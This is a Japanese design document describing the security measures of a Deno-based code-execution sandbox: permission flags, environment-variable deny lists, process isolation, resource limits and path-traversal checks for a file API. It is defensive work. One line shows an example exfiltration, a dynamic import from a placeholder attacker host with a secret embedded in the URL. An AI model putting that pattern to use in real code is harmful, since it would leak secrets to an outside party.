# セキュリティ考慮事項

## Denoパーミッションシステム

Denoの厳格なパーミッションシステムにより、実行コードの権限を細かく制御します。

### ファイルシステムアクセス

- **読み取り**: `--allow-read=/workspace,/tools` で指定ディレクトリのみ読み取り可能
- **書き込み**: `--allow-write` で明示的に許可しない限り書き込み不可（デフォルト：禁止）
- パストラバーサル攻撃の防止（`../` を含むcodeIdを拒否）
- 実行ファイル名の検証（英数字、ハイフン、アンダースコアのみ）

### ネットワークアクセス

- **デフォルト**: すべてのネットワークアクセスを禁止
- `--allow-net=host1,host2` で特定ホストのみ許可可能
- 環境変数 `DENO_ALLOW_NET` で制御
- **リモートモジュール取得の防止**: `--no-remote` フラグによりリモートモジュールの動的インポートを完全にブロック
  - `--allow-net` が無効でもモジュール取得フェーズは実行されるため、`--no-remote` は必須のセキュリティ対策
  - これにより `await import(https://attacker/${secret}.ts)` のようなデータ流出経路を防止

### プロセス実行

- **デフォルト**: サブプロセス実行を禁止
- `--allow-run` で明示的に許可された場合のみ実行可能
- 環境変数 `DENO_ALLOW_RUN` で制御（デフォルト：false）

### 環境変数アクセス

- **パーミッション制御**: `--allow-env` フラグで環境変数アクセスを許可
  - **厳格な制御**: ユーザー指定の環境変数がある場合のみ、そのキーとシステム変数（PATH, DENO_DIR）を許可 (`--allow-env=PATH,DENO_DIR,KEY1,KEY2`)
  - **デフォルト**: 環境変数が指定されていない場合、`--allow-env` フラグは付与されない（完全拒否）
  - **最小権限の原則**: 環境変数が必要な場合のみアクセスを許可し、不要な情報漏洩を防止
- **システム変数の保護**: PATH、DENO_DIR のみを親プロセスから継承（プロセス環境変数として設定）
- **ユーザー定義変数**: リクエストごとに指定可能（バリデーションあり）
- **禁止されたキー**: システム変数（PATH、HOME、USER等）および `DENO_` プレフィックスの上書きを禁止
- **バリデーション制約**:
  - キー形式: 大文字英数字とアンダースコアのみ (`/^[A-Z0-9_]+$/`)
  - 値の最大長: 1000文字
  - 最大個数: 50個
  - 全体サイズ: 10KB以内

## プロセス分離

- 各実行は独立した子プロセス
- 環境変数の分離（システム変数 + ユーザー定義変数のみ）
- 標準入力のクローズ（ユーザー入力不可）

## リソース制限

- タイムアウトによる無限ループ防止（デフォルト5秒、最大300秒）
- コンテナレベルのメモリ・CPU制限
- stdout/stderr バッファ制限（10MB）

## セキュリティ上の利点

従来のtsxと比較して、Denoは以下の脅威を軽減します：

- ✅ **ファイルシステム侵害**: 読み取り/書き込みを指定ディレクトリに限定
- ✅ **ネットワーク攻撃**: 外部通信をホスト単位で制御（デフォルトで禁止）
- ✅ **リモートモジュールによるデータ流出**: `--no-remote` により動的インポートを完全にブロック
- ✅ **プロセス妨害**: サブプロセス実行を禁止し、親プロセス攻撃を防止
- ✅ **環境変数の不正アクセス**: バリデーションと禁止リストによりシステム変数を保護
- ⚠️ **リソース枯渇（DoS）**: タイムアウトとコンテナレベル制限で対処

## 環境変数のセキュリティリスクと対策

### 潜在的なリスク

1. **機密情報の漏洩**: 環境変数に含まれるAPI KEYなどの機密情報が誤ってログに記録される可能性
2. **システム変数の上書き**: PATH、HOME等のシステム変数が上書きされ、予期しない動作を引き起こす可能性
3. **Deno設定の改変**: `DENO_*` 変数を通じてランタイムの動作が変更される可能性
4. **DoS攻撃**: 大量または巨大な環境変数によるメモリ消費

### 実装された対策

| 対策                     | 説明                                                                                                                                                                        |
| ------------------------ | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **禁止リスト**           | システム変数（PATH, HOME, USER等）および `DENO_` プレフィックスの上書きをブロック                                                                                           |
| **バリデーション**       | キー形式、値の長さ、個数、全体サイズを制限                                                                                                                                  |
| **ログ記録の制限**       | 環境変数の値はログに記録しない（機密情報保護）。環境変数のキー名のみを記録し、値は一切ログに出力しない。これによりAPI KEYなどの機密情報が誤ってログファイルに残ることを防止 |
| **スタックトレース制御** | デフォルトではスタックトレースを出力しない。LOG_INCLUDE_STACK=true で明示的に有効化、またはLOG_LEVEL=debugの場合は自動的に有効化。本番環境での内部実装の露出を防止          |
| **プロセス分離**         | 環境変数は実行プロセスごとに独立（他のリクエストへの影響なし）                                                                                                              |
| **一時的な設定**         | 環境変数はプロセス終了とともに破棄される                                                                                                                                    |

### セキュリティベストプラクティス

1. **機密情報の扱い**: API KEYなどはできるだけ短期間のみ有効なトークンを使用
2. **監査ログ**: 環境変数を使用したリクエストは監査ログに記録（値は記録しない）
3. **定期的なレビュー**: 禁止リストを定期的にレビューし、必要に応じて更新

## File Explorer API のセキュリティ

File Explorer API (`/files/*`) はファイルシステムアクセスを提供するため、特別なセキュリティ対策が必要です。

### パストラバーサル防止

- **許可されたパス**: `/workspace` および `/tools` ディレクトリのみアクセス可能
- **パス正規化**: `..` および `.` コンポーネントを解決してから検証
- **シンボリックリンク解決**: シンボリックリンクを解決し、許可されたパス内かを確認
- **隠しファイル制御**: デフォルトで `.` で始まるファイルを除外

### リソース制限

| リソース             | 制限  | 説明                                       |
| -------------------- | ----- | ------------------------------------------ |
| ファイルサイズ       | 10 MB | 読み取り操作の最大ファイルサイズ           |
| ディレクトリ深度     | 100   | 再帰的リスティングの最大深度               |
| リスト結果           | 1000  | list 操作で返される最大ファイル数          |
| 検索結果             | 500   | search 操作で返される最大マッチ数          |
| 検索タイムアウト     | 30 秒 | search 操作の最大時間                      |
| 正規表現タイムアウト | 5 秒  | ファイルあたりの正規表現マッチング最大時間 |

### ReDoS（正規表現DoS）対策

1. **正規表現の複雑さ制限**: 複雑すぎるパターンは拒否
2. **マッチタイムアウト**: 各ファイルに対して5秒の正規表現タイムアウト
3. **パターン検証**: 実行前にパターンを検証

### ログ記録

File Explorer API のすべての操作はログに記録されます：

- ファイルリスト要求（パス、パターン、結果数）
- ファイル読み取り要求（パス、サイズ）
- 検索要求（パス、クエリ、マッチ数）
- エラー（パストラバーサル試行、アクセス拒否など）

詳細な仕様は [FileExplorerAPI.md](./FileExplorerAPI.md) を参照してください。
